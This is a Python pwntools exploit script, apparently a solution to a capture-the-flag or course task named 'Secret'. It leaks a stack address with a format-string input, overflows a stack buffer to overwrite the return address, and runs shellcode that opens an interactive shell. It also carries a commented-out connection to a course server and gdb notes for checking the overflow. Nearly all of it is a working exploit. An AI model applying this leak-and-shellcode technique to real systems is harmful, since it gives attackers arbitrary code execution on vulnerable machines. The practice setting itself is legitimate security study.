from pwn import *
#Task6: Secret
#conn = remote('140.113.207.240',8836)
conn = process('./Secret')
r=conn.recvline()
print(r)

context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.linux.sh())
conn.send("%p,%p,%p\n")
r=conn.recv(1024)
r=str(r)
stack_addr=int(r.split(',')[1], 16)-9	
print(stack_addr)
padding='afcgvfdbgfhjyngsgregvasvdagrehynasfegfbafvadwgtrnbdaveagrehdfbgrahgdnbafrehbrvdbcvgwhvcdvgvbcjhdsbvhjbhvbhjavhdbhvaybvhbdshjvbdbshcbhbchxbhdgcvghsdvabdhsajbvchdsjbvhdsvvdshvbhjbvhjbhvjdvhvjbhjdsbvahjbdshjavbhdjsvbvdshvbhjdbsahjbdhjvhfbsdfvydsgvjhdbshvjbdvbhdjbvhbd'
RIP = stack_addr+len(padding) +8
RIP = p64(RIP)
payload = b'\x20'*len(padding) + RIP + shellcode + b'\x0a'
conn.send(payload)
conn.interactive()

#disassemble verify
#break * (ret)
#x/i $rip
#x/5gx $rsp
#x/s $rsp -> find place of overflow
